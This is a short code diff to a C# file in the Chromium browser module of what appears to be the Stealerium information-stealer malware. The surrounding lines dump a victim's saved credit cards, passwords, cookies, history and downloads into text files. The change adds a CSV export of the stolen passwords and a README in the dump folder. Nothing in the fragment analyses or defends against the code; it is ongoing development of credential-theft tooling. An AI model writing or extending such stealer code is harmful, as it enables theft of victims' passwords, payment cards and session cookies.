@@ -240,7 +240,10 @@ namespace Stealerium.Target.Browsers.Chromium
                         var pBookmarks = Bookmarks.Get(sProfile + "\\Bookmarks");
                         // Await values and write
                         CBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
-                        CBrowserUtils.WritePasswords(pPasswords, sBDir + "\\Passwords.txt");
+                        CBrowserUtils.WritePasswordsToTxt(pPasswords, sBDir + "\\Passwords.txt");
+                        CBrowserUtils.WritePasswordsToCsv(pPasswords, sBDir + "\\Passwords.csv");
+                        // Create a README.txt file in the directory
+                        CBrowserUtils.CreateReadme(sBDir);
                         CBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
                         CBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
                         CBrowserUtils.WriteHistory(pDownloads, sBDir + "\\Downloads.txt");
